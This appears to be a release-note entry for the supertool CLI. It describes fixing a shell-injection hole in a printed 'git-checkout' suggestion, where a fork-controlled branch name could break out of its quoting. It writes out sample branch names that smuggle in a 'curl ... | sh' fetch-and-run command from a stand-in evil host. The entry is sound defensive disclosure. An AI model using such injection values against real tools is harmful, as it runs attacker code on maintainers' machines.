- **A fork-PR branch name closed supertool's own quote in the checkout command five ops tell you to run** ([#924](https://github.com/Digital-Process-Tools/claude-supertool/issues/924)). `gh-pr`, `gh-job`, `gh-run`, `gl-mr` and `gl-job` print a `You are on: …` line under `Branch:`, and its mismatch form ends `⚠ MISMATCH — switch with: ./supertool 'git-checkout:<branch>'`. That branch is the head branch read off the GitHub/GitLab API, so it is named by whoever opened the pull or merge request — from a fork, by anyone at all. `_untrusted.flat()` was applied and removes the ten line separators; it does not remove `'`. So a head branch named `x'; curl -s http://evil.example/i.sh | sh; echo '` closed the quote and appended its own command, inside the one line whose entire rhetorical form is the tool saying what to run next. The reader most likely to paste it is a maintainer mid-review, at speed.

  Flattening line separators and quoting shell metacharacters are different jobs, and only one of them had been done — a partial sanitiser reads as a complete one. The byte-identical string existed at all five call sites before [#904](https://github.com/Digital-Process-Tools/claude-supertool/pull/904) consolidated them into `presets/_branch_locale.py`, so nothing got worse; there is now one place it is fixed rather than five places it was not.

  **The name is now checked, and a name it cannot state safely gets no command at all** — the third state, in the vocabulary the same function's UNKNOWN branch already used:

  ```text
  You are on: master ⚠ MISMATCH — this is x'; curl evil.sh | sh; echo ', a name outside the ordinary-refname set (letters, digits, `. _ / -`, no leading `-`), so no switch command is suggested — check it out yourself, deliberately
  ```

  An ordinary name renders exactly what it rendered before, byte for byte, because the convenience of a pasteable command is the reason the line exists.

  **Refused rather than quoted, and the two are not interchangeable here.** `shlex.quote` is the obvious fix and is what `gl-mr`'s `To resolve:` conflict recipe has done since [#694](https://github.com/Digital-Process-Tools/claude-supertool/issues/694) — right there, because the recipe is the deliverable and refusing to print it leaves a reader mid-conflict with nothing. This suggestion is a convenience, and for a name outside the set a quoted version would be *wrong* as well as safe: it is read back through supertool's colon CLI, which splits `git-checkout:REF` on `:`, so no quoting delivers a ref holding one; and `flat()` has already rewritten any control character in the name, so the quoted command would faithfully name a ref that does not exist. A safe-looking command that silently does the wrong thing is the trade this tracker keeps refusing. The cost, stated plainly: a branch legitimately named outside `[A-Za-z0-9._/-]` — a non-ASCII name, which git permits — loses its one-line command. It keeps the mismatch, the name and the reason, which is a visible extra step rather than a wrong action.

  **The rule already existed and this call site had not adopted it.** `_ORDINARY_REF` / `_shell_ref` / `_ref_warning` lived privately in `presets/gitlab/mr.py`, and the same whitelist guards the four sinks that *execute* a ref ([#150](https://github.com/Digital-Process-Tools/claude-supertool/issues/150), [#818](https://github.com/Digital-Process-Tools/claude-supertool/issues/818), [#852](https://github.com/Digital-Process-Tools/claude-supertool/issues/852)). The sinks that *print* one had no share in it. They are lifted to `presets/_refname.py`, `mr.py` delegates, and a rule whose whole value is being the same rule at every sink is no longer held in two copies.
